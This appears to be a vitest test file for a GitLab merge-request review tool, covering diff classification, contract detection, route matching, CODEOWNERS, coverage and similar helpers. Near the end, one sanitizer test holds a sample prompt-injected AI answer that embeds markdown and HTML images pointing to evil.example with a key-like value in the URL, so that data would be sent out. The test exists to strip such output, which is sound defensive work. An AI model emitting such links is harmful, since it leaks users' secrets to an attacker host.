import { describe, expect, it } from 'vitest';
import { classify } from '../src/core/classify';
import { applyFilters, DEFAULT_FILTERS, groupKey } from '../src/core/filters';
import { detectContracts, routeQuery } from '../src/core/contracts';
import { changedDependencies, identifiers, textDependencies } from '../src/core/deps';
import { parseNestRoutes, parseRtkEndpoints, routeMatches, routeScore, serviceFromConst } from '../src/core/endpoints';
import { appOf, layerOf } from '../src/core/layers';
import { lineRangeFor } from '../src/core/lineMap';
import { applyCommentLabel, commentLabel } from '../src/core/commentLabels';
import { parseMrUrl } from '../src/core/mrUrl';
import { sanitizeAiOutput } from '../src/core/sanitize';
import { isOwner, ownersOf, parseCodeowners } from '../src/core/codeowners';
import { changedLineCoverage, parseLcov, resolveCoveragePaths } from '../src/core/coverage';
import { explainMarkdown } from '../src/ui/explainDoc';
import { parsePatch } from '../src/core/patch';
import { isNewerVersion } from '../src/core/version';

// Parsing, classification and line mapping on real git output are covered in git.test.ts.

function patchOf(path: string, lines: string[]) {
  const count = (c: string) => lines.filter((l) => l[0] === c).length;
  return `diff --git a/${path} b/${path}\n--- a/${path}\n+++ b/${path}\n@@ -1,${count('-')} +1,${count('+')} @@\n${lines.join('\n')}\n`;
}

const run = (patch: string, ws: Record<string, number>) =>
  classify({ patches: parsePatch(patch), whitespaceIgnored: new Map(Object.entries(ws)), trivialGlobs: [] });

describe('classify', () => {
  it('detects code moved between files', () => {
    const body = ['function calculateTotal(items) {', '  return items.reduce(sum, 0);', '  // keep in sync with billing'];
    const files = run(
      patchOf('src/old.ts', body.map((l) => '-' + l)) + patchOf('src/new.ts', body.map((l) => '+' + l)),
      { 'src/old.ts': 3, 'src/new.ts': 3 },
    );
    expect(files.map((f) => f.trivial)).toEqual(['moved-code', 'moved-code']);
  });

  it('never hides a real edit as trivial', () => {
    const files = run(
      patchOf('src/a.ts', ["+import { A } from './a';", '+  doSomethingDangerous();', '-}', '+}']) + patchOf('src/b.ts', ['-}', '+}']),
      { 'src/a.ts': 4, 'src/b.ts': 2 },
    );
    expect(files[0].trivial).toBeUndefined();
  });
});

describe('refactor mode', () => {
  it('groups a rename repeated across files, but not a one-off identifier swap', () => {
    const renamed = (p: string) => patchOf(p, ['-  return getOrder(id);', '+  return fetchOrder(id);']);
    const files = run(
      renamed('src/a.ts') + renamed('src/b.ts') + renamed('src/c.ts') + patchOf('src/auth.ts', ['-  if (user.isAdmin()) {', '+  if (user.isOwner()) {']),
      { 'src/a.ts': 2, 'src/b.ts': 2, 'src/c.ts': 2, 'src/auth.ts': 2 },
    );
    expect(files.map((f) => [f.trivial, f.refactor])).toEqual([
      ['refactor', 'getOrder → fetchOrder'],
      ['refactor', 'getOrder → fetchOrder'],
      ['refactor', 'getOrder → fetchOrder'],
      [undefined, undefined],
    ]);
  });
});

describe('filters', () => {
  it('shows only modified files when asked', () => {
    const files = run(patchOf('src/a.ts', ['-x', '+y']), { 'src/a.ts': 2 });
    const added = { ...files[0], path: 'src/new.ts', change: 'added' as const };
    const out = applyFilters([files[0], added], { ...DEFAULT_FILTERS, changeTypes: ['modified'] }, () => false);
    expect(out.map((f) => f.path)).toEqual(['src/a.ts']);
  });

  it('groups DTOs and tests with their feature folder', () => {
    expect(groupKey('apps/api/src/order/dto/create.dto.ts')).toBe('apps/api/src/order');
    expect(groupKey('apps/api/src/order/__tests__/x.spec.ts')).toBe('apps/api/src/order');
  });
});

describe('multi-line comment range', () => {
  it('builds GitLab line codes for a range spanning unchanged and added lines', () => {
    // Insert 2 lines after old line 3 → new lines 4-5.
    const hunks = parsePatch(patchOf('src/a.ts', ['+x', '+y']).replace('@@ -1,0 +1,2 @@', '@@ -3,0 +4,2 @@'))[0].hunks;
    const r = lineRangeFor('src/a.ts', hunks, 'new', 3, 5);
    expect(r.start.line_code).toMatch(/^[0-9a-f]{40}_3_3$/);
    expect(r.start).toMatchObject({ old_line: 3, new_line: 3 });
    expect(r.end).toMatchObject({ type: 'new', new_line: 5 });
    expect(r.end.line_code).toMatch(/_4_5$/);
    expect(r.end.old_line).toBeUndefined();
  });
});

describe('explain selection: changed dependencies', () => {
  it('keeps only definitions the MR changed', () => {
    // sum3 spans lines 15-18 and its body changed at 16-17; add (1-3) is untouched.
    const hunks = new Map([['src/app.service.ts', [{ oldStart: 16, oldLines: 1, newStart: 16, newLines: 2, lines: ['-a', '+b', '+c'] }]]]);
    const deps = changedDependencies(
      [
        { name: 'sum3', path: 'src/app.service.ts', startLine: 15, endLine: 18 },
        { name: 'add', path: 'src/math.ts', startLine: 1, endLine: 3 },
        { name: 'total', path: 'src/app.service.ts', startLine: 14, endLine: 14 },
      ],
      hunks,
    );
    expect(deps.map((d) => d.name)).toEqual(['sum3']);
    expect(identifiers('return sum3(1, 2, this.x) as number').map((i) => i.name)).toEqual(['sum3']);
  });

  it('falls back to whole-word text matches in changed lines', () => {
    const hunk = { oldStart: 3, oldLines: 1, newStart: 3, newLines: 1, lines: ['-  page_size: 10', '+  page_size: 20'] };
    const other = { oldStart: 9, oldLines: 0, newStart: 9, newLines: 1, lines: ['+  page_sizes_total: 1'] };
    const deps = textDependencies(['page_size'], [{ path: 'config/app.yaml', hunks: [hunk, other] }]);
    expect(deps.map((d) => [d.path, d.startLine])).toEqual([['config/app.yaml', 3]]);
  });
});

describe('explanation document', () => {
  it('links causes to the file line and lists follow-ups', () => {
    const md = explainMarkdown(
      {
        key: 'k',
        prompt: '',
        target: { rel: 'src/a.controller.ts', side: 'new', first: 2, last: 4, label: 'A.handle' },
        answer: { verdict: 'affected', summary: 'Calls changed sum3.', effects: [{ kind: 'behavior', description: 'New total.', cause: { file: 'src/app.service.ts', line: 16, symbol: 'sum3' } }], checks: ['Check totals'] },
        followUps: [{ question: 'Negative c?', answer: 'Still adds.' }],
        ownChanges: 0,
        dependencies: [],
        callers: 0,
        model: 'sonnet',
        reused: false,
      },
      '/wt',
    );
    expect(md).toContain('## 🟠 Affected by changes elsewhere in this MR');
    expect(md).toContain('Caused by [`src/app.service.ts:16`](file:///wt/src/app.service.ts#L16) (`sum3`)');
    expect(md).toContain('### Negative c?');
    expect(md).toContain('_file not changed by the MR_');
  });
});

describe('cross-service contracts', () => {
  const file = (path: string, change: 'modified' | 'added', lines: string[], hunks: { oldStart: number; oldLines: number; newStart: number; newLines: number; lines: string[] }[]) => ({
    ...classify({ patches: parsePatch(patchOf(path, ['+x'])), whitespaceIgnored: new Map([[path, 1]]), trivialGlobs: [] })[0],
    change,
    hunks,
    text: lines,
  });

  it('finds a DTO with a removed field (breaking), a changed Nest route and an emitted event', () => {
    const dto = file('src/order/dto/create-order.dto.ts', 'modified', ['export class CreateOrderDto {', '  name: string;', '  budget?: number;', '}'], [
      { oldStart: 3, oldLines: 1, newStart: 3, newLines: 1, lines: ['-  status: string;', '+  budget?: number;'] },
    ]);
    const ctl = file('src/order/order.controller.ts', 'modified', ["@Controller('orders')", 'export class OrderController {', "  @Get(':id/stats')", '  stats() {}', "  x() { this.bus.emit('order.viewed', {}); }", '}'], [
      { oldStart: 3, oldLines: 1, newStart: 3, newLines: 1, lines: ["-  @Get(':id/summary')", "+  @Get(':id/stats')"] },
      { oldStart: 5, oldLines: 0, newStart: 5, newLines: 1, lines: ["+  x() { this.bus.emit('order.viewed', {}); }"] },
    ]);
    const contracts = detectContracts([dto, ctl], (p) => [dto, ctl].find((f) => f.path === p)?.text);
    const by = Object.fromEntries(contracts.map((c) => [c.name, c]));
    expect(by['CreateOrderDto']).toMatchObject({ kind: 'type', impact: 'breaking', detail: 'removed: status; added: budget?' });
    expect(by['GET /orders/:id/summary']).toMatchObject({ kind: 'route', impact: 'breaking' });
    expect(by['GET /orders/:id/stats']).toMatchObject({ kind: 'route', impact: 'added' });
    expect(by['order.viewed']).toMatchObject({ kind: 'event', impact: 'added' });
    expect(contracts[0].impact).toBe('breaking');
  });

  it('matches route usages with template params', () => {
    const { query, matcher } = routeQuery('/orders/:id/stats');
    expect(query).toBe('orders');
    expect(matcher.test('http.get(`${base}/orders/${id}/stats`)')).toBe(true);
    expect(matcher.test("fetch('/orders/42/stats?x=1')")).toBe(true);
    expect(matcher.test("fetch('/orders/42/statsOld')")).toBe(false);
  });
});

describe('trace: HTTP boundary + layers', () => {
  it('parses RTK endpoints and Nest routes, and matches them', () => {
    const rtk = parseRtkEndpoints([
      'export const orderApi = createApi({',
      '  baseQuery: fetchBaseQuery({ baseUrl: ORDERS_SERVICE_URL }),',
      '  endpoints: (build) => ({',
      '    getOrderStats: build.query<Stats, string>({',
      '      query: (id) => `orders/${id}/stats?range=7d`,',
      '    }),',
      '    archiveOrder: build.mutation<void, string>({',
      "      query: (id) => ({ url: `${BASE}/orders/${id}/archive`, method: 'POST' }),",
      '    }),',
      '  }),',
      '});',
    ].join('\n'));
    expect(rtk.map((e) => [e.name, e.method, e.path, e.hooks[0]])).toEqual([
      ['getOrderStats', 'GET', '/orders/:p/stats', 'useGetOrderStatsQuery'],
      ['archiveOrder', 'POST', '/orders/:p/archive', 'useArchiveOrderMutation'],
    ]);
    expect(serviceFromConst(rtk[0].baseUrlConst)).toBe('orders-service');

    const nest = parseNestRoutes(
      ["@Controller('api/orders')", 'export class OrderController {', "  @Get(':id/stats')", '  @ApiOperation({', '    summary:', "      'Stats (daily)'", '  })', '  async stats(@Param() id: string) {}', '}'].join('\n'),
    );
    expect(nest).toEqual([{ method: 'GET', path: '/api/orders/:id/stats', handler: 'stats', controller: 'OrderController', line: 8 }]);
    expect(routeMatches(rtk[0].path, nest[0].path, 'GET', nest[0].method)).toBe(true);
    expect(routeMatches(rtk[1].path, nest[0].path, 'POST', nest[0].method)).toBe(false);
    // Params must not swallow different paths, and exact literals win.
    expect(routeScore('/accounts/:p', '/users', 'GET', 'GET')).toBe(-1);
    expect(routeScore('/accounts/:p', '/accounts/:id', 'GET', 'GET')).toBeGreaterThan(routeScore('/accounts/:p', '/accounts/options', 'GET', 'GET'));
  });

  it('classifies layers and apps', () => {
    expect(appOf('apps/orders-service/src/order/order.service.ts')).toBe('orders-service');
    expect(layerOf('apps/orders-service/src/order/order.service.ts', 'findAll', 'OrderService')).toBe('service');
    expect(layerOf('apps/orders-service/src/order/order.controller.ts', 'findAll', 'OrderController')).toBe('controller');
    expect(layerOf('apps/web/src/components/OrderCard.tsx', 'OrderCard')).toBe('component');
    expect(layerOf('apps/web/src/hooks/useOrder.ts', 'useOrder')).toBe('hook');
  });
});

describe('comment labels', () => {
  it('expands Conventional Comments shorthands and leaves normal text alone', () => {
    expect(applyCommentLabel('nit: rename to fetchAll')).toBe('**nit:** rename to fetchAll');
    expect(applyCommentLabel('b: this breaks the export job')).toBe('**issue (blocking):** this breaks the export job');
    expect(applyCommentLabel('suggestion (non-blocking): cache it')).toBe('**suggestion (non-blocking):** cache it');
    expect(applyCommentLabel('Note: this is fine')).toBe('Note: this is fine');
    expect(applyCommentLabel('http://example.com')).toBe('http://example.com');
    expect(commentLabel('**question:** why?')).toBe('question');
  });
});

describe('CODEOWNERS and coverage', () => {
  it('resolves owners per section with last-match-wins', () => {
    const rules = parseCodeowners(['* @acme/leads', '', '[Backend]', 'apps/*-service/ @acme/backend', 'apps/orders-service/ @anna', '', '^[Docs] @writer', '*.md'].join('\n'));
    expect(ownersOf('apps/orders-service/src/a.ts', rules).sort()).toEqual(['@acme/leads', '@anna']);
    expect(ownersOf('apps/stats-service/src/a.ts', rules).sort()).toEqual(['@acme/backend', '@acme/leads']);
    expect(ownersOf('README.md', rules).sort()).toEqual(['@acme/leads', '@writer']);
    expect(isOwner(['@acme/backend'], 'bob', ['acme/backend'])).toBe(true);
  });

  it('computes coverage of changed lines from lcov with CI paths', () => {
    const report = parseLcov(['SF:/builds/acme/monorepo/apps/api/src/a.ts', 'DA:3,1', 'DA:4,0', 'DA:9,2', 'end_of_record', 'SF:src/b.ts', 'DA:1,0', 'end_of_record'].join('\n'));
    const resolved = resolveCoveragePaths(report, ['apps/api/src/a.ts', 'apps/api/src/b.ts'], 'apps/api');
    expect([...resolved.keys()]).toEqual(['apps/api/src/a.ts', 'apps/api/src/b.ts']);
    const cov = changedLineCoverage([{ oldStart: 2, oldLines: 0, newStart: 3, newLines: 3, lines: [] }], resolved.get('apps/api/src/a.ts')!);
    expect(cov).toEqual({ measured: 2, covered: 1, uncovered: [4] });
  });
});

describe('AI output sanitizing', () => {
  it('removes images and HTML that could exfiltrate data from a prompt-injected answer', () => {
    const out = sanitizeAiOutput({
      summary: 'Looks fine ![x](https://evil.example/?d=AKIA123) <img src="https://evil.example/p">',
      effects: [{ description: 'see ![ref][1]', cause: { file: 'src/a.ts', line: 3 } }],
    });
    expect(out.summary).toBe('Looks fine [image removed: x] ');
    expect(out.effects[0].description).toBe('see [image removed: ref]');
    expect(out.effects[0].cause.line).toBe(3);
  });
});

describe('parseMrUrl', () => {
  it('parses nested group URLs', () => {
    expect(parseMrUrl('https://gitlab.com/acme/backend/api/-/merge_requests/42/diffs')).toEqual({
      baseUrl: 'https://gitlab.com',
      projectPath: 'acme/backend/api',
      iid: 42,
    });
  });
});

describe('update check', () => {
  it('compares release tags with the installed version', () => {
    expect(isNewerVersion('v0.10.0', '0.9.3')).toBe(true);
    expect(isNewerVersion('v0.1.0', '0.1.0')).toBe(false);
    expect(isNewerVersion('0.1.0', '0.2.0')).toBe(false);
  });
});
